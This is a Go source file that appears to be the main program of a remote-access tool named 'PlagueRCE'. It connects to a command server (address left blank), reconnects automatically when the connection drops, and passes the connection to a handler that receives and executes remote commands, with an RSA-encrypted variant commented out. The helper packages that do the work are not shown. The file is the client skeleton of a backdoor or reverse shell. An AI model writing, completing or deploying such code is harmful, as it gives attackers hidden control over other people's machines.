package main

import (
	"net"
	"packages/PlagueGEN/Code/packages" // Import my local packages
	"runtime"
	// "strings"
)

func main() {
	/*
	   	// Hardcoded RSA public key
	   	const public_key string = `

	   `
	   	// Hardcoded RSA private key
	   	const private_key string = `

	   `
	   	// Format RSA keys properly
	   	// Remove leading and trailing whitespaces from RSA keys
	   	var formatted_public_key string = strings.TrimSpace(public_key)
	   	var formatted_private_key string = strings.TrimSpace(private_key)
	*/

	const server_address string = ""   // Server TCP/IP address
	const OSinfo string = runtime.GOOS // Get operating system information

	// Connect to PlagueRCE server
	conn, _ := packages.ConnectToServer(server_address)

	// Create a channel to notify the handler about the updated connection
	var conn_update chan *net.Conn = make(chan *net.Conn)

	// Start the goroutine to reconnect if disconnected from the internet
	done := make(chan struct{})
	go func() {
		packages.Reconnect(&conn, server_address, conn_update)
		close(done)
	}()

	defer conn.Close() // Close connection if there is a problem connecting

	// Start the handler to receive and execute commands
	packages.Handler(conn, OSinfo, conn_update)
	/*packages.Handler_RSA(conn, OSinfo, formatted_private_key, formatted_public_key, conn_update)*/

}
